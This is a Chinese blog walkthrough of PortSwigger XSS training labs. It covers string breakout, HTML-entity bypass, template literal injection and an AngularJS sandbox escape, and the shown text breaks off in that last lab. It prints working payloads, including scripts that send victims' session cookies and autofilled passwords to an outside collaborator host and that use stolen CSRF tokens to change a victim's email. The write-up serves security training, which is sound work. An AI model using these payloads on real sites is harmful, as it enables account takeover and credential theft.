<h3 id="Lab-Reflected-XSS-into-a-JavaScript-string-with-single-quote-and-backslash-escaped"><a href="#Lab-Reflected-XSS-into-a-JavaScript-string-with-single-quote-and-backslash-escaped" class="headerlink" title="Lab: Reflected XSS into a JavaScript string with single quote and backslash escaped"></a>Lab: Reflected XSS into a JavaScript string with single quote and backslash escaped</h3><blockquote>
<p>​            This lab contains a reflected cross-site scripting  vulnerability in the search query tracking functionality. The reflection occurs inside a JavaScript string with single quotes and backslashes  escaped.        </p>
<p>​            To solve this lab, perform a cross-site scripting attack that breaks out of the JavaScript string and calls the <code>alert</code> function.        </p>
</blockquote>
<p>这题就是用户输入被嵌入到 JavaScript 变量中</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var searchTerms = &#x27;she11f&#x27;;</span><br></pre></td></tr></table></figure>

<p>没有对输入的尖括号转义，我们知道浏览器加载网页时，并非直接执行代码，而是遵循 <strong>“先 HTML 解析 → 后 JavaScript 解析”</strong> 的固定流程，浏览器先扫描整个 HTML 文档，目的是 “拆解页面结构”—— 比如识别出<code>&lt;div&gt;</code>、<code>&lt;input&gt;</code>等标签，以及 <code>&lt;script&gt;</code> 标签包裹的 “JavaScript 代码块”。此时浏览器不关心<code>&lt;script&gt;</code>内部的 JS 语法是否正确，只需要明确：“从<code>&lt;script&gt;</code>开始到<code>&lt;/script&gt;</code>结束的部分，是需要后续执行的 JS 代码”。当 HTML 解析完成，浏览器才会逐个处理之前识别出的 “JS 代码块”—— 对每个<code>&lt;script&gt;</code>内的内容进行语法分析，若语法无致命错误则执行，有错误则终止该代码块的执行（但不影响其他代码块）。</p>
<p>所以我们直接闭合 Script 代码块。</p>
<p><strong>paylaod</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;/script&gt;&lt;img src=1 onerror=alert()&gt;</span><br></pre></td></tr></table></figure>



<h3 id="Lab-Reflected-XSS-into-a-JavaScript-string-with-angle-brackets-and-double-quotes-HTML-encoded-and-single-quotes-escaped"><a href="#Lab-Reflected-XSS-into-a-JavaScript-string-with-angle-brackets-and-double-quotes-HTML-encoded-and-single-quotes-escaped" class="headerlink" title="Lab: Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped"></a>Lab: Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped</h3><blockquote>
<p>​            This lab contains a reflected cross-site scripting  vulnerability in the search query tracking functionality where angle  brackets and double are HTML encoded and single quotes are escaped.        </p>
<p>​            To solve this lab, perform a cross-site scripting attack that breaks out of the JavaScript string and calls the <code>alert</code> function.        </p>
</blockquote>
<p>和上一题的区别是，这次把尖括号HTML编码了，单引号被转义了，但是没有转义反斜杠，所以我们可以转义反斜杠逃逸</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\&#x27;-alert();//</span><br></pre></td></tr></table></figure>

<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://pic-bed-1321641074.cos.ap-guangzhou.myqcloud.com/blog/202509231206059.png" alt="image-20250923120646810"></p>
<h3 id="Lab-Stored-XSS-into-onclick-event-with-angle-brackets-and-double-quotes-HTML-encoded-and-single-quotes-and-backslash-escaped"><a href="#Lab-Stored-XSS-into-onclick-event-with-angle-brackets-and-double-quotes-HTML-encoded-and-single-quotes-and-backslash-escaped" class="headerlink" title="Lab: Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped"></a>Lab: Stored XSS into <code>onclick</code> event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped</h3><blockquote>
<p>​            This lab contains a stored cross-site scripting vulnerability in the comment functionality.        </p>
<p>​            To solve this lab, submit a comment that calls the <code>alert</code> function when the comment author name is clicked.        </p>
</blockquote>
<p>评论区网站位置输入正常网址，控制台看一下</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">onclick=<span class="string">&quot;var tracker=&#123;track()&#123;&#125;&#125;;tracker.track(&#x27;http://1.com&#x27;);&quot;</span></span><br></pre></td></tr></table></figure>

<p>正常情况我们都是想着闭合单引号逃逸，但是单引号会被转义，但是我们可以 HTML 编码单引号来进行绕过</p>
<p>我们之前提到过浏览器加载网页时，并非直接执行代码，而是遵循 <strong>“先 HTML 解析 → 后 JavaScript 解析”</strong> 的固定流程。</p>
<p>我们先来看一下 HTML编码防御标签注入的原理（发生在最开始的 HTML 解析阶段）：</p>
<p>当网站对尖括号做了 HTML 编码后，攻击者注入的代码会变成 </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;lt;img src=1 onerror=alert()&amp;gt;（&amp;lt;是&lt;的 HTML 实体，&amp;gt;是&gt;的 HTML 实体）：</span><br></pre></td></tr></table></figure>

<ul>
<li>浏览器遇到 &amp;lt; 和 &amp;gt;，会按照 HTML 实体规则，将其解码为 “普通文本字符”<code>&lt;</code>和<code>&gt;</code>—— 注意！此时的<code>&lt;</code>和<code>&gt;</code>已经失去了 “界定 HTML 标签” 的语法意义，只是单纯的文本符号。</li>
<li>解析完成后，页面中不会创建任何<code>&lt;img&gt;</code>标签，只会显示一段普通文本 <code>&lt;img src=1 onerror=alert()&gt;</code> ；这段文本只是视觉上的字符，不会被浏览器当作标签或 JS 代码执行，攻击被阻断。</li>
</ul>
<p>当 XSS 上下文是引用标签属性内的一些现有 JavaScript（例如事件处理程序）时，可以利用 HTML 编码来绕过一些输入过滤器。 由于浏览器会 HTML 解码 <code>onclick</code>属性，在 JavaScript 被解释之前，实体被解码为引号，成为字符串分隔符，因此攻击成功。所以当我们注入 &amp;apos;(单引号的HTML编码)的时候，在 HTML 解析完毕之后被还原成了字符串的 <strong>‘</strong> ,而 JS 执行阶段会把单引号当作字符串语法，反而助力攻击。 </p>
<p>我们可以本地实验一下</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">&quot;setBtn&quot;</span>&gt;</span>设置<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;d&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;&quot;</span>&gt;</span>点击测试<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 获取元素</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> setButton = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;setBtn&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> targetDiv = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;d&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">    </span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 给按钮绑定点击事件</span></span></span><br><span class="line"><span class="language-javascript">    setButton.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, <span class="keyword">function</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// 获取输入的网址</span></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">const</span> inputValue = <span class="string">&quot; &#x27;-alert(1)-&#x27; &quot;</span></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">const</span> code =  <span class="string">&quot;var tracker=&#123;track()&#123;&#125;&#125;;tracker.track(&#x27;&quot;</span> + inputValue + <span class="string">&quot;&#x27;);&quot;</span></span></span><br><span class="line"><span class="language-javascript">       </span></span><br><span class="line"><span class="language-javascript">        targetDiv.<span class="title function_">setAttribute</span>(<span class="string">&quot;onclick&quot;</span>, code)</span></span><br><span class="line"><span class="language-javascript">    &#125;);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>可以看到字符串单引号确实会闭合代码里的单引号</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://pic-bed-1321641074.cos.ap-guangzhou.myqcloud.com/blog/202509232235405.png" alt="image-20250923223507276"></p>
<p>所以XSS 防御的核心是 “针对攻击依赖的上下文选择正确的编码 &#x2F; 转义方式”，<strong>HTML 上下文</strong>和 <strong>JS上下文</strong> 执行环境是不一样的。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload：</span><br><span class="line"><span class="attr">http</span>:<span class="comment">//1.com&amp;apos;);alert(1);//</span></span><br><span class="line">执行语句为：</span><br><span class="line">onclick=<span class="string">&quot;var tracker=&#123;track()&#123;&#125;&#125;;tracker.track(&#x27;http://1.com&#x27;);alert(1);//&#x27;);&quot;</span></span><br></pre></td></tr></table></figure>



<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload：</span><br><span class="line"><span class="attr">http</span>:<span class="comment">//foo?&#x27;-alert(1)-&#x27;</span></span><br><span class="line">执行语句为：</span><br><span class="line">onclick=<span class="string">&quot;var tracker=&#123;track()&#123;&#125;&#125;;tracker.track(&#x27;http://foo?&#x27;-alert(1)-&#x27;&#x27;);&quot;</span></span><br></pre></td></tr></table></figure>



<h3 id="Lab-Reflected-XSS-into-a-template-literal-with-angle-brackets-single-double-quotes-backslash-and-backticks-Unicode-escaped"><a href="#Lab-Reflected-XSS-into-a-template-literal-with-angle-brackets-single-double-quotes-backslash-and-backticks-Unicode-escaped" class="headerlink" title="Lab: Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped"></a>Lab: Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped</h3><blockquote>
<p>This lab contains a reflected cross-site scripting vulnerability in the  search blog functionality. The reflection occurs inside a template  string with angle brackets, single, and double quotes HTML encoded, and  backticks escaped. To solve this lab, perform a cross-site scripting  attack that calls the <code>alert</code> function inside the template string.        </p>
</blockquote>
<p>简单搜索一下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var message = `0 search results for &#x27;she11f&#x27;`;</span><br></pre></td></tr></table></figure>

<p>原来是模版字符串</p>
<blockquote>
<p><strong>模板字面量</strong>是用反引号（&#96;&#96;&#96;）分隔的字面量，允许<a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Template_literals#%E5%A4%9A%E8%A1%8C%E5%AD%97%E7%AC%A6%E4%B8%B2">多行字符串</a>、带嵌入表达式的<a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Template_literals#%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%8F%92%E5%80%BC">字符串插值</a>和一种叫<a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Template_literals#%E5%B8%A6%E6%A0%87%E7%AD%BE%E7%9A%84%E6%A8%A1%E6%9D%BF">带标签的模板</a>的特殊结构。</p>
</blockquote>
<p>我们可以利用这个性质插入表达式</p>
<blockquote>
<p>模板字面量还可以包含<em>占位符</em>——一种由美元符号和大括号分隔的嵌入式表达式：<code>$&#123;expression&#125;</code>。字符串和占位符被传递给一个函数（要么是默认函数，要么是自定义函数）</p>
</blockquote>
<p>说明可以在 &#96;&#96;&#96; 内部插入 ${},${} 里面可以塞 JS 代码，会自动执行</p>
<p><strong>paylaod</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;alert()&#125;</span><br></pre></td></tr></table></figure>



<h3 id="Lab-Exploiting-cross-site-scripting-to-steal-cookies"><a href="#Lab-Exploiting-cross-site-scripting-to-steal-cookies" class="headerlink" title="Lab: Exploiting cross-site scripting to steal cookies"></a>Lab: Exploiting cross-site scripting to steal cookies</h3><blockquote>
<p>This lab contains a stored XSS vulnerability in the blog comments  function. A simulated victim user views all comments after they are  posted. To solve the lab, exploit the vulnerability to exfiltrate the  victim’s session cookie, then use this cookie to impersonate the victim.        </p>
</blockquote>
<p>用户会不断访问评论区，我们要窃取cookie的话，BP开一个DNS服务器，然后评论区发送cookie上去就行了。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">location=<span class="string">&quot;http://i6pm28xcfy8i31gr9nuau0ahj8pzdq1f.oastify.com?cookie=&quot;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>当然这是最常规的方法，特别讲一下还有一种方法就是利用 XSS 执行 CSRF 攻击，我们让用户自己把 cookie 发在评论区，当然这种方法不太隐蔽，因为它会公开 Cookie，还会泄露攻击的证据。CSRF 令牌对 XSS 无效，因为 XSS 允许攻击者直接从响应中读取令牌值。</p>
<p>我们先抓个包</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">POST /post/comment HTTP/1.1</span><br><span class="line">Host: 0add00fe0453e512818be801005d0073.web-security-academy.net</span><br><span class="line">Cookie: session=6ul2YIs0HUuS8hgAMAsMW4AYFJjmRb2X</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:143.0) Gecko/20100101 Firefox/143.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 105</span><br><span class="line">Origin: https://0add00fe0453e512818be801005d0073.web-security-academy.net</span><br><span class="line">Referer: https://0add00fe0453e512818be801005d0073.web-security-academy.net/post?postId=6</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-Site: same-origin</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Priority: u=0, i</span><br><span class="line">Te: trailers</span><br><span class="line">Connection: keep-alive</span><br><span class="line"></span><br><span class="line">csrf=EUV55Kf9RW9OiO5slKFwg4ZSiqi3etzM&amp;postId=6&amp;comment=she11f&amp;name=she11f&amp;email=she11f%40163.com&amp;website=</span><br></pre></td></tr></table></figure>

<p>其他参数见名就知道意思了，就是这个csrf参数，根据修改应该是一种令牌，用户登陆就分配一个，如果发评论的 csrf 不匹配的话就无法发布评论，我们可以在前端找到这个值</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input required=&quot;&quot; type=&quot;hidden&quot; name=&quot;csrf&quot; value=&quot;EUV55Kf9RW9OiO5slKFwg4ZSiqi3etzM&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>因为这个站点有 XSS 漏洞，所以我们可以直接 js 获取这个 input 元素里的 csrf 值然后来让受害者自动发评论</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">document.getElementsByName(&quot;csrf&quot;)[0].value</span><br></pre></td></tr></table></figure>

<p>现在就是用 js 让用户发评论了</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">fetch</span>(<span class="string">&#x27;https://0add00fe0453e512818be801005d0073.web-security-academy.net/post/comment&#x27;</span>, &#123;</span><br><span class="line">  <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">  <span class="attr">body</span>: <span class="string">&#x27;csrf=&#x27;</span>+<span class="variable language_">document</span>.<span class="title function_">getElementsByName</span>(<span class="string">&quot;csrf&quot;</span>)[<span class="number">0</span>].<span class="property">value</span>+<span class="string">&#x27;&amp;postId=6&amp;comment=&#x27;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span>+<span class="string">&#x27;&amp;name=she11f&amp;email=she11f@163.com&amp;website=&#x27;</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>因为还是要在前端执行，最后还记得加上 &lt;script&gt; 标签。</p>
<p>可是报错了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Uncaught TypeError: can&#x27;t access property &quot;value&quot;, document.getElementsByName(...)[0] is undefined</span><br></pre></td></tr></table></figure>

<p>为什么会未定义呢，明明控制台能打印，虽然我们说过网页先 HTML 解析 → 后 JavaScript 解析，但是<strong>HTML 从上到下顺序解析，遇到 <code>&lt;script&gt;</code> 时会暂停 HTML 解析，优先执行 JavaScript 代码，执行完后再继续解析后续 HTML</strong>，我们这段插入的js代码，在input标签之上自然就先解析也就找不到调用的变量了。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="variable language_">document</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;DOMContentLoaded&#x27;</span>, <span class="keyword">function</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript"><span class="title function_">fetch</span>(<span class="string">&#x27;https://0add00fe0453e512818be801005d0073.web-security-academy.net/post/comment&#x27;</span>, &#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">  <span class="attr">body</span>: <span class="string">&#x27;csrf=&#x27;</span>+<span class="variable language_">document</span>.<span class="title function_">getElementsByName</span>(<span class="string">&quot;csrf&quot;</span>)[<span class="number">0</span>].<span class="property">value</span>+<span class="string">&#x27;&amp;postId=6&amp;comment=&#x27;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span>+<span class="string">&#x27;&amp;name=she11f&amp;email=she11f@163.com&amp;website=&#x27;</span></span></span><br><span class="line"><span class="language-javascript">&#125;)</span></span><br><span class="line"><span class="language-javascript">&#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>受害者成功评论自己的 cookie</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://pic-bed-1321641074.cos.ap-guangzhou.myqcloud.com/blog/202509242111099.png" alt="image-20250924211143751"></p>
<h3 id="Lab-Exploiting-cross-site-scripting-to-capture-passwords"><a href="#Lab-Exploiting-cross-site-scripting-to-capture-passwords" class="headerlink" title="Lab: Exploiting cross-site scripting to capture passwords"></a>Lab: Exploiting cross-site scripting to capture passwords</h3><blockquote>
<p>This lab contains a stored XSS vulnerability in the blog comments  function. A simulated victim user views all comments after they are  posted. To solve the lab, exploit the vulnerability to exfiltrate the  victim’s username and password then use these credentials to log in to  the victim’s account.        </p>
</blockquote>
<p>这个实验让我们利用 XSS 钓鱼来获取用户的密码，会模拟受害者自动填充账号密码。所以我们可以在评论区放两个input输入框</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">username</span> <span class="attr">id</span>=<span class="string">username</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">password</span> <span class="attr">name</span>=<span class="string">password</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>当点击 input 的时候，浏览器根据 type 属性判断出这是账号和密码就会询问是否自动填充账号密码，这样就能触发浏览器自动询问填充账号密码了</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">required</span>=<span class="string">&quot;&quot;</span> <span class="attr">type</span>=<span class="string">&quot;username&quot;</span> <span class="attr">id</span>=<span class="string">username</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">required</span>=<span class="string">&quot;&quot;</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>再然后给密码框添加一个 onchange 事件，密码长度的值大于 0 就可以把填充的受害者账号密码发送给我们服务器(BP的DNS解析器记得点击自动轮询)</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">username</span> <span class="attr">id</span>=<span class="string">username</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">password</span> <span class="attr">name</span>=<span class="string">password</span> <span class="attr">onchange</span>=<span class="string">&quot;if(this.value.length)fetch(&#x27;https://qoiukgfkx6qql9yzrvcic8sp1g77v4jt.oastify.com&#x27;,&#123;</span></span></span><br><span class="line"><span class="string"><span class="tag">method:&#x27;POST&#x27;,</span></span></span><br><span class="line"><span class="string"><span class="tag">body:username.value+&#x27;:&#x27;+this.value</span></span></span><br><span class="line"><span class="string"><span class="tag">&#125;);&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>这题也可以继续利用 csrf 让用户把账号密码放在评论区（原理是一样的），当然平时还是不要这样干</p>
<h3 id="Lab-Exploiting-XSS-to-bypass-CSRF-defenses"><a href="#Lab-Exploiting-XSS-to-bypass-CSRF-defenses" class="headerlink" title="Lab: Exploiting XSS to bypass CSRF defenses"></a>Lab: Exploiting XSS to bypass CSRF defenses</h3><blockquote>
<p>​            This lab contains a stored XSS vulnerability in the blog  comments function. To solve the lab, exploit the vulnerability to steal a CSRF token, which you can then use to change the email address of  someone who views the blog post comments.        </p>
<p>​            You can log in to your own account using the following credentials: <code>wiener:peter</code>        </p>
</blockquote>
<p>可以直接从返回包里拿 csrf，这样就不用考虑 js 执行的时候评论区 input 里面 csrf 的值还没渲染的问题了</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="title function_">fetch</span>(<span class="string">&#x27;/my-account&#x27;</span>)</span><br><span class="line">  .<span class="title function_">then</span>(<span class="function"><span class="params">r</span> =&gt;</span> r.<span class="title function_">text</span>())</span><br><span class="line">  .<span class="title function_">then</span>(<span class="function"><span class="params">html</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> token = html.<span class="title function_">match</span>(<span class="regexp">/name=&quot;csrf&quot; value=&quot;(\w+)&quot;/</span>)[<span class="number">1</span>];</span><br><span class="line">    <span class="title function_">fetch</span>(<span class="string">&#x27;/my-account/change-email&#x27;</span>, &#123;</span><br><span class="line">      <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">      <span class="attr">body</span>: <span class="string">&#x27;csrf=&#x27;</span>+token+<span class="string">&#x27;&amp;email=she11f@163.com&#x27;</span></span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>也可以跟前面评论区写cookie那题一样从 DOM 里面拿受害人的 csrf </p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">  <span class="variable language_">document</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;DOMContentLoaded&#x27;</span>, <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line"><span class="title function_">fetch</span>(<span class="string">&#x27;https://0a1b00410498a3b5806c177c008d0099.web-security-academy.net/my-account/change-email&#x27;</span>, &#123;</span><br><span class="line">  <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">  <span class="attr">body</span>: <span class="string">&#x27;csrf=&#x27;</span>+<span class="variable language_">document</span>.<span class="title function_">getElementsByName</span>(<span class="string">&quot;csrf&quot;</span>)[<span class="number">0</span>].<span class="property">value</span>+<span class="string">&#x27;&amp;email=she11f@163.com&#x27;</span></span><br><span class="line">&#125;)</span><br><span class="line">&#125;)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>



<h3 id="Lab-Reflected-XSS-with-AngularJS-sandbox-escape-without-strings"><a href="#Lab-Reflected-XSS-with-AngularJS-sandbox-escape-without-strings" class="headerlink" title="Lab: Reflected XSS with AngularJS sandbox escape without strings"></a>Lab: Reflected XSS with AngularJS sandbox escape without strings</h3><blockquote>
<p>​            This lab uses AngularJS in an unusual way where the <code>$eval</code> function is not available and you will be unable to use any strings in AngularJS.        </p>
<p>​            To solve the lab, perform a cross-site scripting attack that escapes the sandbox and executes the <code>alert</code> function without using the <code>$eval</code> function.        </p>
</blockquote>
<p>依旧搜索看源代码，关键代码</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;angular.<span class="title function_">module</span>(<span class="string">&#x27;labApp&#x27;</span>, []).<span class="title function_">controller</span>(<span class="string">&#x27;vulnCtrl&#x27;</span>,<span class="keyword">function</span>(<span class="params">$scope, $parse</span>) &#123;</span><br><span class="line">                            $scope.<span class="property">query</span> = &#123;&#125;;</span><br><span class="line">                            <span class="keyword">var</span> key = <span class="string">&#x27;search&#x27;</span>;</span><br><span class="line">                            $scope.<span class="property">query</span>[key] = <span class="string">&#x27;she11f&#x27;</span>;</span><br><span class="line">                            $scope.<span class="property">value</span> = $parse(key)($scope.<span class="property">query</span>);</span><br><span class="line">                        &#125;);&lt;/script&gt;</span><br><span class="line">                        <span class="language-xml"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">ng-controller</span>=<span class="string">vulnCtrl</span>&gt;</span>0 search results for &#123;&#123;value&#125;&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br></pre></td></tr></table></figure>

<ul>
<li><code>$parse(key)</code>：解析字符串<code>&#39;search&#39;</code>为 Angular 表达式（即获取<code>search</code>属性）；</li>
